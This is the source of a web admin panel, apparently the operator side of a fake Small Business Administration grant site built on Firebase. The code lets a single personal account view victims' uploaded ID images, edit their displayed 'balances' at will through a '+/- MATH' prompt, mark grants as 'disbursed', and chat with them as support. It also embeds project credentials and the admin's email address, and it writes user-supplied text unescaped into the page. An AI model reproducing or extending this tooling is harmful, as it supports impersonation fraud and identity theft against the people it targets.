<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SBA MASTER | MATH V8.1</title>
    <style>
        :root { --admin-red: #ba0c2f; --admin-blue: #00274c; --bg: #0f172a; }
        body { background: var(--bg); color: #f8fafc; font-family: -apple-system, sans-serif; margin: 0; padding-bottom: 30px; }
        
        .admin-nav { background: #1e293b; padding: 15px; border-bottom: 3px solid var(--admin-red); position: sticky; top: 0; z-index: 1000; text-align: center; }
        
        .stats-wrapper { display: flex; overflow-x: auto; gap: 10px; padding: 15px; scrollbar-width: none; }
        .stat-card { min-width: 140px; background: #334155; padding: 15px; border-radius: 12px; text-align: center; flex-shrink: 0; }
        .stat-card p { margin: 5px 0 0; font-size: 18px; font-weight: bold; color: #38bdf8; }

        .container { padding: 10px; }
        .section-title { font-size: 11px; color: #38bdf8; text-transform: uppercase; letter-spacing: 1px; margin: 25px 0 10px; font-weight: bold; display: flex; align-items: center; gap: 5px; }
        
        .user-card { background: #1e293b; padding: 15px; border-radius: 10px; margin-bottom: 10px; border-left: 4px solid #38bdf8; position: relative; }
        .user-card b { font-size: 14px; display: block; margin-bottom: 5px; max-width: 70%; }
        .user-card span { font-size: 11px; color: #94a3b8; display: block; }
        .user-card .bal { color: #10b981; font-weight: bold; font-size: 16px; margin-top: 5px; }

        .req-item { background: #ffffff; color: #0f172a; padding: 15px; border-radius: 12px; margin-bottom: 15px; border-top: 5px solid #f59e0b; }
        
        .chat-card { background: #ffffff; color: #1e293b; border-radius: 12px; margin-bottom: 20px; overflow: hidden; }
        .chat-header { background: #f1f5f9; padding: 10px; font-weight: bold; display: flex; justify-content: space-between; font-size: 11px; border-bottom: 1px solid #ddd; }
        .chat-history { height: 250px; overflow-y: auto; background: #f8fafc; padding: 10px; display: flex; flex-direction: column; gap: 8px; }
        .msg { max-width: 85%; padding: 10px; border-radius: 12px; font-size: 13px; }
        .msg.admin { align-self: flex-end; background: var(--admin-blue); color: white; border-bottom-right-radius: 2px; }
        .msg.user { align-self: flex-start; background: #e2e8f0; border-bottom-left-radius: 2px; }
        
        .reply-box { padding: 10px; display: flex; gap: 5px; background: #fff; border-top: 1px solid #eee; }
        .reply-box input { flex: 1; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 14px; }
        
        .action-btn { background: #10b981; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; flex: 1; font-size: 11px; }
        .math-btn { background: #38bdf8; color: #0f172a; border: none; font-size: 10px; padding: 8px 10px; border-radius: 6px; position: absolute; right: 15px; top: 15px; font-weight: 900; }
        .view-btn { display: inline-block; background: #64748b; color: white; padding: 8px 15px; text-decoration: none; border-radius: 6px; font-size: 11px; margin: 5px 5px 10px 0; }
    </style>
</head>
<body>

    <div class="admin-nav">
        <h1 style="font-size: 16px; margin: 0; color: white;">COMMAND V8.1 | MATH</h1>
        <div id="adminEmail" style="font-size: 10px; color: #38bdf8; margin-top: 3px;">INITIALIZING...</div>
    </div>

    <div class="stats-wrapper">
        <div class="stat-card"><h3>Users</h3><p id="stat-users">0</p></div>
        <div class="stat-card"><h3>Tasks</h3><p id="stat-reqs">0</p></div>
        <div class="stat-card"><h3>Payout</h3><p id="stat-cash">$0</p></div>
    </div>

    <div class="container">
        <div class="section-title">ðŸ‘¤ Active Clients</div>
        <div id="userList"></div>

        <div class="section-title">âš¡ Action Stream</div>
        <div id="requestFeed"></div>

        <div class="section-title">ðŸ’¬ Messages</div>
        <div id="chatFeed"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { getFirestore, collection, onSnapshot, query, orderBy, addDoc, serverTimestamp, doc, deleteDoc, updateDoc, getDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
            authDomain: "sba-grant-2026.firebaseapp.com",
            projectId: "sba-grant-2026",
            storageBucket: "sba-grant-2026.firebasestorage.app",
            messagingSenderId: "838430821326",
            appId: "1:838430821326:web:6438deacb334076a64f99f"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);

        onAuthStateChanged(auth, (user) => {
            if (user && user.email === "liger4683@gmail.com") {
                document.getElementById('adminEmail').innerText = "AGENT ONLINE: " + user.email;
            } else { window.location.href = "index.html"; }
        });

        // 1. USERS LISTENER
        onSnapshot(collection(db, "users"), (snap) => {
            const list = document.getElementById('userList');
            let total = 0; 
            list.innerHTML = "";
            snap.forEach(d => {
                const u = d.data(); 
                let b = u.balance || 0;
                if(typeof b === 'string') b = b.replace(/[$,]/g, '');
                total += parseFloat(b);
                
                list.innerHTML += `
                    <div class="user-card" id="card-${d.id}">
                        <button class="math-btn" onclick="mathUpdate('${d.id}', '${u.fullName}')">+/- MATH</button>
                        <b onclick="navigator.clipboard.writeText('${d.id}'); alert('UID Copied')">${u.fullName || 'User'}</b>
                        <span>${u.email}</span>
                        <div class="bal">$${parseFloat(b).toLocaleString(undefined, {minimumFractionDigits: 2})}</div>
                        <span style="color:#38bdf8; font-size:9px; margin-top:4px;">UID: ${d.id.substring(0,10)}...</span>
                    </div>`;
            });
            document.getElementById('stat-users').innerText = snap.size;
            document.getElementById('stat-cash').innerText = "$" + total.toLocaleString();
        });

        // 2. MATH LOGIC
        window.mathUpdate = async (uid, name) => {
            const card = document.getElementById(`card-${uid}`);
            const currentBalText = card.querySelector('.bal').innerText;
            const currentBal = parseFloat(currentBalText.replace(/[$,]/g, '')) || 0;
            const input = prompt(`Current: $${currentBal.toLocaleString()}\n\nEnter amount to ADD or SUBTRACT (-):`, "0");
            if (input === null || input === "") return;
            const change = parseFloat(input.replace(/[$,]/g, ''));
            if (isNaN(change)) { alert("Invalid number!"); return; }
            const newTotal = currentBal + change;
            try {
                await updateDoc(doc(db, "users", uid), { balance: newTotal });
                alert(`Updated! New Balance: $${newTotal.toLocaleString()}`);
            } catch (e) { alert("Error: " + e.message); }
        };

        // 3. ACTION STREAM (AUTO-PILOT VERSION)
        onSnapshot(collection(db, "requests"), (snap) => {
            const feed = document.getElementById('requestFeed');
            let pCount = 0;
            feed.innerHTML = "";
            snap.forEach(d => {
                const r = d.data(); 
                if(r.status === "SUCCESSFUL" || r.status === "APPROVED") return;
                pCount++;
                const isKyc = r.type && r.type.includes("KYC");
                feed.innerHTML += `
                    <div class="req-item">
                        <small>REQ ID: ${d.id.substring(0,8)}</small>
                        <b style="display:block; font-size:16px; margin:5px 0;">${r.type}</b>
                        <p style="margin:0; font-size:12px;">Client: ${r.userName}</p>
                        <h2 style="margin:10px 0; color:var(--admin-red);">$${r.amount ? parseFloat(r.amount).toLocaleString() : '0.00'}</h2>
                        ${isKyc ? `<a href="${r.frontImg}" target="_blank" class="view-btn">ID FRONT</a><a href="${r.backImg}" target="_blank" class="view-btn" style="background:var(--admin-red)">ID BACK</a>` : ''}
                        <div style="display:flex; gap:10px;">
                            <button onclick="approveReq('${d.id}', '${r.userId}', '${r.type}')" class="action-btn">APPROVE</button>
                            <button onclick="deleteReq('${d.id}')" class="action-btn" style="background:#64748b">REJECT</button>
                        </div>
                    </div>`;
            });
            document.getElementById('stat-reqs').innerText = pCount;
        });

        window.approveReq = async (docId, uid, type) => {
            const userRef = doc(db, "users", uid);
            const reqRef = doc(db, "requests", docId);

            try {
                const reqSnap = await getDoc(reqRef);
                const reqData = reqSnap.data();
                const amtToApprove = parseFloat(reqData.amount) || 0;

                if(type.includes("KYC")) {
                    await updateDoc(userRef, { kycStatus: "APPROVED", status: "IDENTITY VERIFIED" });
                    await updateDoc(reqRef, { status: "APPROVED" });
                } 
                else if(type === "GRANT_APPLICATION") {
                    // AUTO-FUND LOGIC: Get current balance first
                    const userSnap = await getDoc(userRef);
                    const currentBal = parseFloat(userSnap.data().balance) || 0;
                    const newTotal = currentBal + amtToApprove;

                    await updateDoc(userRef, { balance: newTotal, status: "GRANT DISBURSED" });
                    await updateDoc(reqRef, { status: "SUCCESSFUL" });
                    alert(`GRANT APPROVED: $${amtToApprove.toLocaleString()} added to user.`);
                }
                else {
                    // Standard approval for other types
                    await updateDoc(userRef, { status: "COMPLETED" });
                    await updateDoc(reqRef, { status: "SUCCESSFUL" });
                }
                alert("SUCCESSFULLY PROCESSED");
            } catch (e) { alert("Error: " + e.message); }
        };

        window.deleteReq = async (id) => { if(confirm("Delete?")) await deleteDoc(doc(db, "requests", id)); };

        // 4. CHAT LOGIC (UNTOUCHED)
        onSnapshot(query(collection(db, "support_tickets"), orderBy("timestamp", "asc")), (snapshot) => {
            const chatFeed = document.getElementById('chatFeed');
            const groups = {};
            snapshot.forEach(snap => {
                const data = snap.data();
                if (!groups[data.userId]) groups[data.userId] = { name: data.userName || "User", msgs: [] };
                groups[data.userId].msgs.push(data);
            });
            chatFeed.innerHTML = "";
            for (const uid in groups) {
                const group = groups[uid];
                const card = document.createElement('div'); card.className = "chat-card";
                card.innerHTML = `<div class="chat-header"><span>${group.name.toUpperCase()}</span></div><div class="chat-history" id="chat-${uid}"></div><div class="reply-box"><input type="text" id="input-${uid}" placeholder="Reply..."><button onclick="sendReply('${uid}', '${group.name}')" class="action-btn" style="flex:0; padding:10px 20px;">SEND</button></div>`;
                chatFeed.appendChild(card);
                const hist = document.getElementById(`chat-${uid}`);
                group.msgs.forEach(m => {
                    const div = document.createElement('div');
                    div.className = `msg ${m.sender === 'ADMIN' ? 'admin' : 'user'}`;
                    div.innerText = m.message;
                    hist.appendChild(div);
                });
                hist.scrollTop = hist.scrollHeight;
            }
        });

        window.sendReply = async (uid, name) => {
            const val = document.getElementById(`input-${uid}`).value;
            if(!val) return;
            await addDoc(collection(db, "support_tickets"), { userId: uid, userName: name, message: val, sender: "ADMIN", timestamp: serverTimestamp() });
            document.getElementById(`input-${uid}`).value = "";
        };
    </script>
</body>
</html>
